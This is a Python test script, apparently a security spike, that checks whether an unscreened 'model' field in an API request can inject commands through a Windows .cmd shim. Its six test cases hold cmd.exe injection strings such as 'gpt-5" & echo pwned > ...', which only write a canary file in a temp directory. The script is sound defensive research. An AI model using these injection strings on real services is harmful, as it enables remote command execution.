"""SPIKE 2 (scratch, packet G1-SEC-02): isolate the `--model` argv element.

`POST /api/ikarus/ask` body["model"] reaches `_codex(..., model=...)` unscreened
and becomes `args += ["--model", model]`. That element is single-line and fully
attacker-chosen, so the newline truncation that neuters the (SYSTEM-prefixed)
prompt does not apply to it at all.

No daedalus import here on purpose: this measures the PLATFORM, with the exact
argv shape `_codex` builds. Nothing spawns a real codex.
"""
import json
import subprocess
import sys
import tempfile
from pathlib import Path

PY = sys.executable
CAPTURE = """\
import json, sys
from pathlib import Path
here = Path(__file__).resolve().parent
(here / "argv.json").write_text(json.dumps(sys.argv[1:]), encoding="utf-8")
"""

PROMPT = "You are Ikarus, the assistant.\n\nUser: what is 2+2"


def case(label: str, model: str) -> None:
    box = Path(tempfile.mkdtemp(prefix="model-argv-"))
    (box / "capture.py").write_text(CAPTURE, encoding="utf-8")
    shim = box / "codex.cmd"
    shim.write_text(f'@echo off\r\n"{PY}" "%~dp0capture.py" %*\r\n', encoding="utf-8")
    canary = box / "canary.txt"
    model = model.replace("<CANARY>", str(canary))

    argv = [str(shim), "exec", "--cd", str(box), "--sandbox", "read-only",
            "--skip-git-repo-check", "--color", "never",
            "--output-last-message", str(box / "last.txt"),
            "--model", model, PROMPT]
    completed = subprocess.run(
        argv, cwd=str(box), text=True, capture_output=True, encoding="utf-8",
        errors="replace", stdin=subprocess.DEVNULL, timeout=60, check=False)
    seen = box / "argv.json"
    print(f"--- {label}")
    print(f"    model sent  : {model!r}")
    print(f"    cmdline     : {subprocess.list2cmdline(argv[1:])[:160]!r}")
    print(f"    rc          : {completed.returncode}")
    print(f"    CANARY      : {canary.exists()}")
    if canary.exists():
        print(f"    canary body : {canary.read_text(encoding='utf-8', errors='replace')!r}")
    if seen.exists():
        got = json.loads(seen.read_text(encoding="utf-8"))
        print(f"    child argv  : {got[:12]}")
    else:
        print("    child argv  : <the child never ran>")
    for stream, name in ((completed.stdout, "stdout"), (completed.stderr, "stderr")):
        blob = (stream or "").strip()
        if blob:
            print(f"    {name}      : "
                  f"{blob[:200].encode('ascii', 'replace').decode('ascii')!r}")


if __name__ == "__main__":
    case("A quoted redirect target", 'gpt-5" & echo pwned > "<CANARY>" & rem ')
    case("B unquoted redirect target", 'gpt-5" & echo pwned > <CANARY> & rem ')
    case("C close the relay's quote, then a bare command",
         'gpt-5" & echo pwned > <CANARY>')
    case("D no quote at all, bare &", "gpt-5 & echo pwned > <CANARY>")
    case("E space-free & (list2cmdline adds no quotes)",
         "gpt-5&echo pwned><CANARY>")
    case("F %VAR% expansion only", "gpt-5-%USERNAME%")
